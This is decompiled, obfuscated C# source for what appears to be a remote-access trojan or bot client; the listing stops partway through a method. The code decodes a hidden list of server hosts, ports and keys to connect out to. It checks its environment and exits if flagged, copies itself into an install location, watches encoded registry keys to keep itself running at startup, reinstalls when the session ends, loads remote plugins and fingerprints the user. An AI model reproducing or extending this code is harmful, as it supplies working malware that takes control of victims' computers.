using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Plugin;

namespace ns0;

internal class Class8
{
	private const string string_0 = "NEF35+rn5+fr5+fn5ubn55/n5+fn5+fnJ+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnZ+fn5/UGofXnm/C0CJ/oM7QIO09QWgdXWVZOWUhUB0pIVVVWWwdJTAdZXFUHUFUHKzY6B1RWS0wV9PTxC+fn5+fn5+c3LOfnM+jq5yK1czXn5+fn5+fn58fn6Qjy6O/n5wPn5+ft5+fn5+fndSHn5+cH5+fnJ+fn5+cn5+cH5+fn6efn6+fn5+fn5+fr5+fn5+fn5+dn5+fn6efn5+fn5+rnJ2zn5/fn5/fn5+fn9+fn9+fn5+fn5/fn5+fn5+fn5+fn5ych5+cy5+fn5yfn52fq5+fn5+fn5+fn5+fn5+fn5+fn50fn5/Pn5+ePIOfnA+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnB+fn7+fn5+fn5+fn5+fn7wfn5y/n5+fn5+fn5+fn5xVbTF9b5+fnewHn5+cH5+fnA+fn5+nn5+fn5+fn5+fn5+fn5wfn50cVWVpZSufn52fq5+fnJ+fn5+vn5+cF5+fn5+fn5+fn5+fn5+cn5+cnFVlMU1ZK5+fz5+fn50fn5+fp5+fnCefn5+fn5+fn5+fn5+fnJ+fnKefn5+fn5+fn5+fn5+fn5+dXIefn5+fn5y/n5+fp5+znjwzn5+f75+fo5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5z3pD/jn5/Hn5+la+efn8WTw5+fr5xHn5/oX6udA5+fn6Ofn+Oda+ufn8Wfy5+frWvvn5/Fn8efn62Xx5+frZfLn5+vpVvzn5/HnZfLn5+tW/efn8edl8ufn61b+5+fx8WXy5+frVv/n5/Hn+2fy5+fr+2fx5+fr7fIS5+4R5+fn+hfp5zrn5+fp5+f45+laAOfn8Wfy5+frWvvn5/Fn8efn62Xx5+frZfLn5+tWAefn8Vzu5+fp8WXy5+frVv3n5/HnZfLn5+tW/+fn8ef7Z/Ln5+v7Z/Hn5+vt8hLn7hEF6Q/45+fxEef6F+jn8ufn5+rn5/jpYvnn5+vxEuftEQnp6mT55+frEfoX6Ofy5+fn6+fn+Oli+ufn6/ES5+0RCenqZPrn5+sR+hfq5zHn5+fs5+f45+kPA+fn8Q8E5+fxt/3n5+gPBefn8f5WBufn8fHtdVD95en95ejz7xT95+39gVv95+foVgfn5/FaCOfn8fIS72UJ5+fx8hLn7hHx5xHn5+f6F+rnF+fn5+3n5/jpYvPn5+vx7fLu6g8K5+fxW/Pn5+jz6WPz5+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvPn5+vx7fLu6g8M5+fxW/Pn5+jz6WPz5+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvTn5+vx7fLu6g8K5+fxW/Pn5+jz6WP05+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvTn5+vx7fLu6g8M5+fxW/Pn5+jz6WP05+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvXn5+vx7fLu6g8K5+fxW/Pn5+jz6WP15+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+3n5/jpYvXn5+vx7fLu6g8M5+fxW/Pn5+jz6WP15+fr7+4P6OfnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+7n5/jpYvbn5+vx7fLu6g8K5+fxW+rn5+nz6WP25+fr7+4P6efnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+7n5/jpYvbn5+vx7fLu6g8M5+fxW+rn5+nz6WP25+fr7+4P6efnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+/n5/jpYvfn5+vx7fLu6g8K5+fxW+nn5+nz6WP35+fr7+4P6ufnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5+/n5/jpYvfn5+vx7fLu6g8M5+fxW+nn5+nz6WP35+fr7+4P6ufnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5/Dn5/jpYvjn5+vx7fLu6g8K5+fxW+vn5+nz6WP45+fr7+4P6+fnEvHt7uXo/eXo9PAUvxH6F+rnF+fn5/Dn5/jpYvjn5+vx7fLu6g8M5+fxW+vn5+nz6WP45+fr7+4P6+fnEvHt7uXo/eXo9PAUvxH6F+rnK+fn5/Hn5/jn6vHt/RXpEgTpYvbn5+v75ejy7hT16WL25+fr6etW7efn7ecSBOli9+fn6/vl6PLuFPXpYvfn5+vp61bp5+ft5xLnEfoX6ucE5+fn8ufn+OfpYvjn5+v75ejx7RT16WL45+fr6epW8efn7ecR5+fn+hfq5wTn5+fy5+f45+li8+fn6/vl6PHtFPXpYvPn5+vp+1YN5+fx5xHn5+fqF+rnL+fn5+fn5+fn6WLz5+fr+/tWDefn8efpYvTn5+v7+1YN5+fx5+li9efn6/v7Vg3n5/Hn6WL35+fr+/tW6efn7efpYvjn5+v7+1bx5+ft5xEF6Q/45+fxESk6MSno5+jn5+fn5/Pn5+ddGRUXFRwXHhke5+fn5+znU+fn5+vw5+cKZefnV/Dn58fu5+cKOltZUFVOWufn5+c3+Ofn7+fn5wo8Ouc/+Ofn9+fn5wouPDAr5+fnT/jn53/p5+cKKVNWSefn5+fn5+fp5+foPgSd8PDv5+fn4Qwa5/3n5+jn5+cM5+fn8Ofn5/rn5+cZ5+fnGOfn5w3n5+fr5+fn+ufn5/Ln5+fo5+fn7efn5+jn5+fz5+fnAefn5+jn5+fo5+fn6efn5+vn5+fn5/Hn6Ofn5+fn7ed953bn7eeP53bn7eeU53bn7eeo53bn7ee153bn7ecD6Hbn7ecu6BPo7edp6Dro7eeG6Hzo7edD6Xbn8eds6Vfp7efA6Xbn7efe68zr7ef17Mzr7ecS7Mzr7ecx7Mzr7edK7Mzr7edj7Mzr7ed+7Mzr7eeZ7Mzr7efR7LLs7efl7LLs7efz7czr7ecM7czr7ec87SntTudQ7efn7ed/7V/t7eef7V/t7ee97Xbn7efT7Xzo7efw7l/t7ecL7nbn7ecY7szr7ect7nbn7ed17nbn7eeX7obu7ee67nbn5+fn5+jn5+fn5+jn6Ofo6Ofn/ecQ5+zn6Ofo5+jo5+cX5xDn7Ofo5+zn6Ojn5ynnEOfs5+jn8Ofo6OfnPucQ5/Dn6Of05+jo5+dK5xDn8Ofr5/Tn6Af350/nEOf05+7n9Ofo5/fnWucQ5/Tn8ef152jn9+dl5xDn9Ofz5/jn7e3Z5xHnPWfh5xTnPWfm5xTn7e3Z5xHnPWfu6CLnPWf16CLn7ef86Cbn7ecI6Cnn7ec16C3n+Od56Djn+OeT6Dzn6OfN6YXn6OcO6oXn6Ocx6oXn6OdU6o/n6Odx6pnn6OeR6qPn6OfS6rXn6Of167nn5+fn5+rnbf+b5/Hn6Ofn5+fn6uet6KHn9+fq5+fn5+fq563ow+f/5+zn5+fn5+rnrejP5wvn8Ofn5+fn6udt/5vn8efx5+fn5+fq563ooef35/Pn5+fn5+rnrejD5//n9efn5+fn6uet6M/nC+f55+fn5+fq523/m+fx5/rn5+fn5+rnreih5/fn/Ofn5+fn6uet6MPn/+f+5+fn5+fq563oz+cL5wLnNwfn5+fnbf+b5zTnA+dPB+fn5+d955boQOcD57cH5+fn533noOhH5wTnFgjn5+fnbf+b5zTnBefn5+fn5+et9KzoTucF5+fn5+fn5630tehO5wXn5+fn5+fnrfTF6E7nBefn5+fn5+et9NDoUucF5+fn5+fn56304ehX5wXn5+fn5+fnrfT56VfnBefn5+fn5+et9AvpV+cF5x8I5+fn523vF+lb5wXnNgjn5+fnbe8t6WDnBefn5+fn5+et9EvpZucG5+fn5+fn5630celr5wbnPwjn5+fnbe9/6XDnBudWCOfn5+dt74/pdOcG518I5+fn523vn+l55wfn5+fn5+fnreyo6TTnB+fn5+fn5+et7LPpfucH57UI5+fn563ou+l05wnnuwjn5+fnbe/f6YnnCuf3Cefn5+dt7/XqiecL5zMJ5+fn523vFuqJ5wznbwnn5+fnbe8i6onnDeerCefn5+dt7znqiecO5+cK5+fn523vReqJ5w/nIwrn5+fnbe9a6pPnEOdfCufn5+dt72Tqk+cR55sK5+fn523veOqd5xLn1wrn5+fnbe+D6p3nE+cTC+fn5+dt75rqp+cU508L5+fn523vp+qn5xXniwvn5+fnbee36q3nFufbC+fn5+dt57zqYOcY5wcM5+fn523nx+o05xnnMwzn5+fnaOfQ6jTnGeeHDOfn5+dr/5vnNOcZ5+fn6OeJ6+fn6eeQ6+fn6OeX6+fn6efQ6ufn6OeX6+fn6efQ6ufn6uee6+fn6+eJ6+fn6Oen6+fn6OeJ6+fn6eeQ6+fn6OeX6+fn6efQ6ufn6OeX6+fn6efQ6ufn6uee6+fn6+eJ6+fn6Oen6+fn6OeJ6+fn6eeQ6+fn6OeX6+fn6efQ6ufn6OeX6+fn6efQ6ufn6uee6+fn6+eJ6+fn6Oen6+fn6Oeu6+fn6Oez6+fn6Oe16+fn6Oe16+fn6Oe76+fn6efQ6ufn6Oe76+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6Oe16+fn6OfH6+fn6efQ6ufn6OfQ6lDnm+fh51jnm+fh52Dnm+fh52jnm+fh53Dnm+fh53jnm+fh54Dnm+fh54jnm+fh55Dnm+fm55jnm+fh56Dnm+fh56jnm+fh57Dnm+fr6MDnm+fx6Mjnm+c059Dnm+c05wDnm+c05/Pnm+c05zDnm+c05yjnm+c05yjnluj86Njn2u005zDn4O0D6Njn6O405zDnm+cP6CjnoOgV6ODnm+c05wDnEO4r6PDoIe4x6OjoP+466PDoUe5D6JjnZe5O5xjnm+fh5xjnb+4p5wDofu5U6Ajoo+5g6ADos+5U6Ejnoeez6O/n7+cY5+/n8+cd5+/n++cY5+/n/+cd5xXnCufo6RXnYudd6RXnGuf16RXnWudU6RXn8ue76BXn+ufH6BXnAufi6BXnEue76BXnIufi6BXnMufi6BXnOucU6RXnSuc+6RXnUudL6Sjpwucd50jpwucd5+fqwucd5wfqwucd52fqwucd54fqwucd5wjoG+gi6CfoTOhy6IHokOif6Knor+jw5+jn5+fN6Rjn5+cO6hjn5+cx6hjn5+dU6vPn5+dx6u/n5+eR6vfn8Ofo5+fnEuu85+fnF+u85+fnI+u85+fnKuvA5+fnN+vF5+fnS+vF5+fnWevF5+fnYevJ5+fnQ+nO5+fnc+vT5+fnfevY5+fnA+jc5/fnCufp5+/nCefp5+nn+Ofq5/fnDOfr5+/nC+fr5+nn+efs5+/nDeft5/fnDuft5+nn+ufu5/fnEOfv5+/nD+fv5+nn++fw5/fnEufx5+/nEefx5+nn/Ofy5/fnFOfz5+/nE+fz5+nn/ef05+nn/uf25+nn/+f45+jnAOf45+nnAef65+nnAuf85+jnBOf+5+nnA+f+5+nnBecA5/bo62fn5+jn5+fn5+fn5+fn5+fnZefn5+nn5+fn5+fn5+fn5+jnbefn5+fn6efn5+fn5+fn5+fn6OdX6efn5+cw523oMOd86DDni+gw55ro5+fnIzRWS1xTTCXnMDdTXE5QVRVLU1PnNlxbV1xbLF1MVVsvSFVLU0xZ5zdTXE5QVecwVVdcWyxdTFVbL0hVS1NMWec5TEpMUF1MSyxdTFVbL0hVS1NMWec3U1xOUFU6W0hbTOc6UEtM5zdTXE5QVShZTlrnOkxZUEhTUGFMWecwN1NcTlBV51RaSlZZU1BJ5zpgWltMVOc0XFNbUEpIWlsrTFNMTkhbTOcsVVxU5zZJUUxKW+cVSltWWecwVV1WUkznMChaYFVKOUxaXFNb5yhaYFVKKkhTU0lISlLnKUxOUFUwVV1WUkzn54vIHixVSzBVXVZSTOddSFNcTEZG5zU2NSznOTw1NTA1LucqMzAsNTvnOiw5PSw55y9MSEtMWecuXFBL5zdTXE5QVS5cUEvnOmBaW0xUFSpWU1NMSltQVlVaFS5MVUxZUErnM1BaW0cY5ytIW0jnOmBaW0xUFTlcVVtQVEwVOkxZUEhTUGFIW1BWVRUtVllUSFtbTFlaFSlQVUhZYOcpUFVIWWAtVllUSFtbTFnnSU3nOmBaW0xUFTA25zRMVFZZYDpbWUxIVOdUWuc6TFlQSFNQYUznK0xaTFlQSFNQYUznTkxbRjVIVEznTkxbRitMWkpZUFdbUFZV505MW0YoXFtPVlnnTkxbRipcWVlMVVs6W0hbTOdOTFtGOltWVzZVK1BaSlZVVUxKW1BWVedOTFtGLF9MSlxbTDZVM1ZIS+dOTFtGL0haLVZZVOdOTFtGLF9MSlxbTDZVM1ZISyhZTlrnWkxbRixfTEpcW0w2VTNWSEsoWU5a5z1MWVpQVlXnTkxbRj1MWVpQVlXnOmBaW0xUFT5QVUtWXloVLVZZVFrnLVZZVOdOTFtGMFVXXFstVllU505MW0Y6W0hbTDZJUUxKW+daTFtGOltIW0w2SVFMSlvnTkxbRi5cUEvnMFVQW1BIU1BhTOcsX0xKXFtM5zpbVlfnLF1MVVsvSFVLU0xZ5yxfTEpcW1BWVSpWVFdTTFtM50hLS0YsX0xKXFtQVlUqVlRXU0xbTOdZTFRWXUxGLF9MSlxbUFZVKlZUV1NMW0znOltIWVtMS+dIS0tGOltIWVtMS+dZTFRWXUxGOltIWVtMS+c6W1ZXV0xL50hLS0Y6W1ZXV0xL51lMVFZdTEY6W1ZXV0xL5zBVV1xb50hLS0YwVVdcW+dZTFRWXUxGMFVXXFvnNlxbV1xb50hLS0Y2XFtXXFvnWUxUVl1MRjZcW1dcW+c5TEpMUF1MS+dIS0tGOUxKTFBdTEvnWUxUVl1MRjlMSkxQXUxL5zpMVUvnNlU5TEpMUF1MS+csX0xKXFtMS+dM5yMsX0xKXFtMNlUzVkhLKFlOWiVSRkYpSEpSUFVOLVBMU0vnIzpbSFtMNklRTEpbJVJGRilISlJQVU4tUExTS+c1SFRM5ytMWkpZUFdbUFZV5yhcW09WWecqXFlZTFVbOltIW0znOltWVzZVK1BaSlZVVUxKW1BWVecsX0xKXFtMNlUzVkhL5y9IWi1WWVTnLF9MSlxbTDZVM1ZISyhZTlrnMFVXXFstVllU5zpbSFtMNklRTEpb51ZJUUxKW+dUTFtPVkvnWkxVS0xZ50pIU1NJSEpS51lMWlxTW+dIWU5a50nnXUhTXEznWltIW0w2SVFMSlvnWlBLTOc6YFpbTFQVOUxNU0xKW1BWVecoWlpMVElTYDtQW1NMKFtbWVBJXFtM5yhaWkxUSVNgK0xaSllQV1tQVlUoW1tZUElcW0znKFpaTFRJU2AqVlVNUE5cWUhbUFZVKFtbWVBJXFtM5yhaWkxUSVNgKlZUV0hVYChbW1lQSVxbTOcoWlpMVElTYDdZVktcSlsoW1tZUElcW0znKFpaTFRJU2AqVldgWVBOT1soW1tZUElcW0znKFpaTFRJU2A7WUhLTFRIWVIoW1tZUElcW0znKFpaTFRJU2AqXFNbXFlMKFtbWVBJXFtM5zpgWltMVBU5XFVbUFRMFTBVW0xZVlc6TFldUEpMWucqVlQ9UFpQSVNMKFtbWVBJXFtM5y5cUEsoW1tZUElcW0znKFpaTFRJU2A9TFlaUFZVKFtbWVBJXFtM5yhaWkxUSVNgLVBTTD1MWVpQVlUoW1tZUElcW0znOmBaW0xUFStQSE5VVlpbUEpa5ytMSVxOTkhJU0woW1tZUElcW0znK0xJXE5OUFVONFZLTFrnOmBaW0xUFTlcVVtQVEwVKlZUV1BTTFk6TFldUEpMWucqVlRXUFNIW1BWVTlMU0hfSFtQVlVaKFtbWVBJXFtM5zlcVVtQVEwqVlRXSFtQSVBTUFtgKFtbWVBJXFtM5zpMWVBIU1BhSElTTChbW1lQSVxbTOc6W1lMSFTnKlNWWkznO1YoWVlIYOcrUFpXVlpM5ypWVFdQU0xZLkxVTFlIW0xLKFtbWVBJXFtM5ztgV0znLkxbO2BXTOcoWlpMVElTYOcuTFsoWlpMVElTYOc5XFVbUFRMO2BXTC9IVUtTTOcuTFs7YFdMLVlWVC9IVUtTTOcuTFsqXFpbVlQoW1tZUElcW0xa505MW0Y9SFNcTOcsVFdbYOcrTFNMTkhbTOcqVlRJUFVM5zpgWltMVBU7T1lMSEtQVU7nMFVbTFlTVkpSTEvnKlZUV0hZTCxfSk9IVU5M5zlMVFZdTOcsXUxVWyhZTlrn5+fn5+oH5+fn5+e7BJbLNbeRKH8GkgtPFB0p5++eYUM9ABvHcOwH6egD/+4H6ej5C/kD8gfr+fj5C/kD+fwD7Afo6Pn46e3v6u34++vn5+fn6+jn5+fq7fj/6e316u34AO3t/PkE6APqB+fo6u35COrt+Qzt5+gE7PkD7efo+QME7OoH5/XrB+f4++oH5+nrB+f5A+wH6Oj5A+sH5/kQ6wfn+RTqB+cD6wfo6APrB+f4AO0H6egD+QPq7fkY7Afo6PkY6u358+wH6Oj58+rt+e/sB+jo+e/q7fn37Afo6Pn37gfp6Pj/+QPq7fkD6e0D6g/n9esP5/j76g/n6esP5/kD6w/n+RDrD+f5FOoP5wPrD+f4AOsH6Oj16wfo6OnsB+jo+FDrB+jo7+z8+QToA+0H6ej5YAPrB+cE7O3u6QTsBOzsB+joBOzsB+gD+WDt7un5A/kD6+7o+QPq7ugD7Afn+Wdo7+fo+Wds+Wdo7+fo+Wdo+Gdw7wfpBAP5Z2jp7u7qBAP4AOny5+n5Z3T5Z3T5Z3Tz9+jqBef3BecF5wXn6/Ho+Rjw7uv5GPkY+Rjp6/Ho+fPw7uv58/nz+fPp6/Ho+e/w7uv57/nv+e/p6/Ho+ffw7uv59/n3+ffp7O7p+P/p6u7o6e4H6egD+Wd88ujn7TdTXE5QVefnAejn/DVMWxQ+TEhdTAc3U1xOUFUHKUhaTOfn7Ojn5+fn8+jn7l86UFNMVVvn5wXo5wAqVldgWVBOT1sHqZAHXzpQU0xVWwcZFxgY5+cQ6OcLHhodSBtMFxwUSkkgTBQbSRxNFCBLSxwUGUhKHSBMTUoXSyAg5+fz6OfuGBUXFRcVF+fn7+jn7ujn5+fn7+jn7+fn5+fnBejn6Oc76f0+WUhXNVZVLF9KTFdbUFZVO09ZVl5a6Ofn5+fn5+citXM15+fn5+nn5+dh5+fnqyDn56sC5+c5Ois6V15vpeFT5zRqm/TySxFamOnn5+cqIUM8WkxZWkM1SFtPSFVDK1ZKXFRMVVtaQz1QWlxIUwc6W1xLUFYHGRcYF0M3WVZRTEpbWkM3WVZRTEpbBysrVjpMWUM3U1xOUFVDVklRQytMSVxOQzA3U1xOUFUVV0tJ5+fnTyHn5+fn5+fn5+fnZSHn5+cH5+fn5+fn5+fn5+fn5+fn5+fn5+fn51ch5+fn5+fn5+dGKlZZK1NTNEhQVedUWkpWWUxMFUtTU+fn5+fn5gznByfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn6Of35+fn/+fnZ+fn5+fn5+fn5+fn5+fn6Ofo5+fnF+fnZ+fn5+fn5+fn5+fn5+fn6Ofn5+fnL+fn5z8n5+cL6ufn5+fn5+fn5+cL6hvn5+c95zrnRuc95yznOec65zDnNuc150bnMOc15y3nNufn5+fnpOvW5efn6Ofn5+jn5+fn5+fn6Ofn5+fnJufn5+fn5+fr5+fn6efn5+fn5+fn5+fn5+fn5yvn5+fo5z3nSOdZ5y3nUOdT50znMOdV503nVufn5+fnC+fr5+fnO+dZ50jnVeda51PnSOdb51DnVudV5+fn5+fn55fra+nn5+jnOudb51nnUOdV507nLedQ51PnTOcw51XnTedW5+fnR+nn5+jnF+cX5xfnF+cX5xvnSecX5+fnK+f95+jnKudW51TnVOdM51XnW+da5+fnNedM51vnFOc+50znSOdd50znB+c351PnXOdO51DnVecH5ynnSOda50zn5+cX5+/n6Ocq51bnVOdX50jnVedg5zXnSOdU50zn5+fn51/nOudQ51PnTOdV51vn5+cf5+7n6Oct51DnU+dM5yvnTOda50rnWedQ51fnW+dQ51bnVefn5+fnN+dT51znTudQ51Xn5+fn5xfn7+fo5y3nUOdT50znPedM51nnWudQ51bnVefn5+fnGOcV5xfnFecX5xXnF+fn5x/n8+fo5zDnVedb50znWedV50jnU+c150jnVOdM5+fnMOc351PnXOdO51DnVecV50vnU+dT5+fnP+cA5+jnM+dM507nSOdT5yrnVudX52DnWedQ507nT+db5+fnKudW51fnYOdZ51DnTudP51vnB+eQ5wfnX+c651DnU+dM51XnW+cH5xnnF+cY5xjn5+fn5yfn8+fo5zbnWedQ507nUOdV50jnU+ct51DnU+dM51XnSOdU50zn5+cw5zfnU+dc507nUOdV5xXnS+dT51Pn5+cX5+7n6Oc351nnVudL51znSudb5zXnSOdU50zn5+fn5zfnU+dc507nUOdV5+fn5+cb5+/n6Oc351nnVudL51znSudb5z3nTOdZ51rnUOdW51Xn5+cY5xXnF+cV5xfnFecX5+fnH+fv5+jnKOda51rnTOdU50nnU+dg5wfnPedM51nnWudQ51bnVefn5xjnFecX5xXnF+cV5xfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fnF+fn8+fn53ch5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5w==";

	private static List<GClass0> list_0;

	private static List<Class3> list_1;

	private static bool bool_0;

	private static bool bool_1;

	private static int int_0;

	[MTAThread]
	private static int Main()
	{
		if (Class10.bool_13 && (!Class10.bool_0 || !(Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class10.string_1, Class1.smethod_3(Class10.string_2, bool_0: true)))))
		{
			Class11.smethod_0();
		}
		smethod_0();
		smethod_1();
		try
		{
			while (true)
			{
				string text = Console.ReadLine();
				if (text.ToLower() == "clear")
				{
					Console.Clear();
				}
			}
		}
		catch
		{
		}
		Process.GetCurrentProcess().WaitForExit();
		return 0;
	}

	private static void smethod_0()
	{
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		bool_0 = false;
		bool_1 = false;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_6;
		Class13.smethod_0(Class10.string_6);
		if (Class13.Boolean_0)
		{
			Process.GetCurrentProcess().Kill();
			return;
		}
		string[] array = Class1.smethod_3(Class10.string_0, bool_0: true).Split(new char[1] { '|' });
		list_1 = new List<Class3>();
		for (int i = 0; i < array.Length; i++)
		{
			if (!string.IsNullOrEmpty(array[i]))
			{
				Class3 @class = new Class3(array[i].Split(new char[1] { '>' })[0], int.Parse(array[i].Split(new char[1] { '>' })[1]), Class1.smethod_2(array[i].Split(new char[1] { '>' })[2].Trim(), bool_0: true));
				@class.Event_1 += smethod_9;
				@class.Event_0 += smethod_8;
				@class.Event_3 += smethod_7;
				list_1.Add(@class);
			}
		}
		GClass1.smethod_0();
		GClass2.Event_0 += smethod_5;
		if (Class10.bool_0)
		{
			if (Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class10.string_1, Class1.smethod_3(Class10.string_2, bool_0: true)))
			{
				new Thread(Class7.smethod_0).Start();
			}
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_4));
		}
		if (Class10.bool_10 && Process.GetCurrentProcess().MainModule!.FileName != Path.Combine(Class10.string_1, Class1.smethod_3(Class10.string_2, bool_0: true)))
		{
			GClass1.smethod_3();
		}
		if (Class10.bool_0 && Process.GetCurrentProcess().MainModule!.FileName == Path.Combine(Class10.string_1, Class1.smethod_3(Class10.string_2, bool_0: true)))
		{
			GClass2.smethod_1();
		}
		else
		{
			GClass2.smethod_2();
		}
		if (Class10.bool_0)
		{
			list_0 = new List<GClass0>();
			GClass0 gClass = new GClass0(Class10.registryHive_0, Class10.string_9);
			gClass.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
			gClass.Event_0 += smethod_2;
			if (Class10.bool_12)
			{
				if (Class10.bool_1)
				{
					GClass0 gClass2 = new GClass0(RegistryHive.CurrentUser, Class1.smethod_3("FjIpNzokNSgfECwmNTI2Mik3HxosMcO+nOsnMjo2HwY4NTUoMTcZKDU2LDIxHxU4MQ==", bool_0: true));
					gClass2.Event_0 += smethod_3;
					gClass2.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass2);
				}
				if (Class10.bool_2)
				{
					GClass0 gClass3 = new GClass0(RegistryHive.CurrentUser, Class1.smethod_3("FjIpNzokNSgfECwmNTI2Mik3HxosMcO+nOsnMjo2HwY4NTUoMTcZKDU2LDIxHxU4MQ==", bool_0: true));
					gClass3.Event_0 += smethod_3;
					gClass3.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass3);
				}
				if (Class10.bool_3)
				{
					GClass0 gClass4 = new GClass0(RegistryHive.LocalMachine, Class1.smethod_3("FhIJFxoEFQgfECwmNTI2Mik3HwQmNyw5KOPDvpzrFig3ODMfDDE2NyQvLygn4wYyMDMyMSgxNzY=", bool_0: true));
					gClass4.Event_0 += smethod_3;
					gClass4.GEnum0_0 = GEnum0.flag_0 | GEnum0.flag_2;
					list_0.Add(gClass4);
				}
			}
		}
		Class10.string_11 = smethod_19(smethod_18() + "|" + Environment.UserName);
	}

	private static void smethod_1()
	{
		foreach (Class3 item in list_1)
		{
			item?.method_0();
		}
		if (list_0 != null)
		{
			foreach (GClass0 item2 in list_0)
			{
				item2.method_2();
			}
		}
		Class5.smethod_2();
		if (Class10.bool_4)
		{
			smethod_16();
		}
	}

	private static void smethod_2(object sender, EventArgs e)
	{
		ThreadStart start = GClass2.smethod_0;
		new Thread(start).Start();
	}

	private static void smethod_3(object sender, EventArgs e)
	{
		ThreadStart start = Class7.smethod_1;
		new Thread(start).Start();
	}

	private static void smethod_4(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_Reason() == 2 && Class10.bool_0)
		{
			Class7.smethod_0();
		}
	}

	private static void smethod_5(object object_0, IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		try
		{
			iplugin_0.add_ExecutionComplete((EventHandler)smethod_13);
			iplugin_0.add_Output(new OutputEventHandler(smethod_12));
			iplugin_0.add_Started((EventHandler)smethod_11);
			iplugin_0.add_Stopped((EventHandler)smethod_10);
			GClass2.sortedList_1[iplugin_0.get_Guid()] = iplugin_0;
		}
		catch
		{
		}
	}

	private static Assembly smethod_6(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
